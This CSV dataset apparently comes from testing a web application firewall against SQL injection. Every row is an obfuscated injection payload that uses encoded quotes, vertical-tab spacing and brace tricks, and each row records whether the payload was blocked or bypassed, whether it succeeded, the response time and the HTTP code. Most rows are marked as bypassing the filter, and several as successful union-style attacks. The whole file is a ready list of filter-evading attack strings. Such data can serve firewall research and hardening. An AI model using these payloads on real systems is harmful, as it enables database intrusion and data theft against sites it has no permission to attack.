Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0'<@=1.%0bor+!+{x%0b,Bypassed,No,None,Unknown,0.009,69.43,No,500
0%27<@!=1.+or%0bnot+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0111,70.03,No,200
0'<@!=1.+or+false=+(,Bypassed,No,None,booleanAtk,0.0094,70.16,No,500
0'<@=1.+||%0bnot%0btrue=,Blocked,No,None,Unknown,0.0119,70.3,No,403
0'<@!=1+or%0bnot+{a+,Bypassed,No,None,Unknown,0.0144,70.3,No,500
0'<@!=1%0bor%0b0=%0b(,Bypassed,No,None,Unknown,0.0148,70.3,No,500
0%27<@!=.1+or%0bnot+{x+,Bypassed,Yes,unionAtk,Unknown,0.0091,70.3,No,200
0%27<@!=1.+or+not+{`if`+,Bypassed,Yes,unionAtk,Unknown,0.0109,70.3,No,200
0%27<@!=1%0b||%0bnot%7e0=,Bypassed,Yes,unionAtk,Unknown,0.0136,70.3,No,200
0'<@=1%0b||+{a+1}=1%0blike,Bypassed,No,None,Unknown,0.0089,70.3,No,500
0%27<@!=1%0bor+!+{a+,Bypassed,Yes,unionAtk,Unknown,0.015,70.3,No,200
0'<@!=1+||+not~0=,Bypassed,No,None,Unknown,0.0122,70.3,No,500
0%27<@!=.1+||+not+{a+,Bypassed,Yes,unionAtk,Unknown,0.0116,70.3,No,200
0'<@!=1+or+not%0b{x%0b,Bypassed,No,None,Unknown,0.0109,70.3,No,500
0'<@=.1%0bor+!+{x+,Bypassed,No,None,Unknown,0.014,70.3,No,500
0%27<@=.1%0bor%0bnot+{`if`%0b,Bypassed,Yes,unionAtk,Unknown,0.0109,70.3,No,200
0%27<@!=1+or%0bnot+{x,Bypassed,Yes,unionAtk,Unknown,0.0192,70.3,No,200
0%27<@=1.+||+not%7efalse=,Bypassed,Yes,unionAtk,Unknown,0.0074,70.3,No,200
0'<@!=1.%0b||%0bnot%0b{x+,Bypassed,No,None,Unknown,0.0095,70.3,No,500
0'<@!=1.%0bor%0bnot+{a+,Bypassed,No,None,Unknown,0.0104,70.3,No,500
0%27<@!=1.+or%0b{x%0b(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0109,70.3,No,200
0%27<@!=1%0b||+not+{x+,Bypassed,Yes,unionAtk,Unknown,0.0147,70.3,No,200
0%27<@!=.1+||+not+{a+,Bypassed,Yes,unionAtk,Unknown,0.0126,70.3,No,200
0%27<@!=1+||+not+{`if`,Bypassed,Yes,unionAtk,Unknown,0.0092,70.3,No,200
0'<@=.1+||%0b!%0b{x+,Bypassed,No,None,Unknown,0.0141,70.3,No,500
0%27<@=.1+||%0b!%0b{`if`%0b,Bypassed,Yes,unionAtk,Unknown,0.0112,70.3,No,200
0%27<@!=.1+||+!+{`if`+,Bypassed,Yes,unionAtk,Unknown,0.0138,70.3,No,200
0%27<@=.1%0b||%0bnot%0b1=,Bypassed,Yes,unionAtk,Unknown,0.0097,70.3,No,200
0'<@=1+or%0bnot%0b{x+,Bypassed,No,None,Unknown,0.0116,70.3,No,500
0%27<@=1%0bor+!%0b{x+,Bypassed,Yes,unionAtk,Unknown,0.0122,70.3,No,200
